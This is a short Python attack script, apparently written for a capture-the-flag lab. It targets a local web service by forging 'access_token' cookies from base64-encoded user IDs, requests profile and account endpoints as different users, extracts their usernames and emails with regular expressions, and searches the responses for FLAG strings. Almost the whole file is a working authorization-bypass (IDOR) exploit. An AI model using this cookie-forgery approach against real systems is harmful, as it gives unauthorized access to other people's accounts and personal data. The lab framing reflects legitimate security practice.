import requests
import base64
import re

base_url = "http://127.0.0.1:32773"

def test_with_cookie(user_id, endpoint):
    """Test endpoint with specific user cookie"""
    encoded = base64.b64encode(str(user_id).encode()).decode()
    cookie_value = f'"Bearer {encoded}"'
    headers = {"Cookie": f"access_token={cookie_value}"}
    
    try:
        response = requests.get(
            base_url + endpoint,
            headers=headers,
            timeout=10
        )
        return response.text, response.status_code
    except Exception as e:
        return f"Error: {e}", 0

# Test various endpoints that might show user data
potential_endpoints = [
    "/profile",
    "/dashboard", 
    "/api/profile",
    "/user",
    "/users",
    "/settings",
    "/account"
]

print("="*80)
print("CHECKING USER-SPECIFIC ENDPOINTS")
print("="*80)

for endpoint in potential_endpoints:
    print(f"\n[TESTING ENDPOINT: {endpoint}]")
    print("-"*60)
    
    # Test with user 1 (original)
    resp1, status1 = test_with_cookie(1, endpoint)
    
    # Test with user 2
    resp2, status2 = test_with_cookie(2, endpoint)
    
    print(f"User 1: Status {status1} | Length: {len(resp1)}B")
    print(f"User 2: Status {status2} | Length: {len(resp2)}B")
    
    if status1 != 404 and status2 != 404:
        # Look for differences
        if resp1 == resp2:
            print("  [SIMILAR] Responses are identical")
        else:
            print("  [DIFFERENT] Responses differ!")
            
            # Extract user info
            def extract_info(text):
                patterns = {
                    'user': r'user[:\s]+([a-z0-9_\-\.]+)',
                    'email': r'email[:\s]+([a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,})',
                    'name': r'name[:\s]+([a-z\s]+)',
                    'id': r'id[:\s]+([0-9]+)'
                }
                
                info = {}
                for key, pattern in patterns.items():
                    matches = re.findall(pattern, text, re.I)
                    if matches:
                        info[key] = matches[0]
                return info
            
            info1 = extract_info(resp1)
            info2 = extract_info(resp2)
            
            if info1:
                print(f"  User 1 info: {info1}")
            if info2:
                print(f"  User 2 info: {info2}")
            
            # Check for flags
            flags1 = re.findall(r'FLAG\{[^}]+\}', resp1)
            flags2 = re.findall(r'FLAG\{[^}]+\}', resp2)
            
            if flags1 or flags2:
                print(f"[!] FLAGS FOUND!")
                if flags1:
                    print(f"  User 1: {flags1[0]}")
                if flags2:
                    print(f"  User 2: {flags2[0]}")

print("\n" + "="*80)
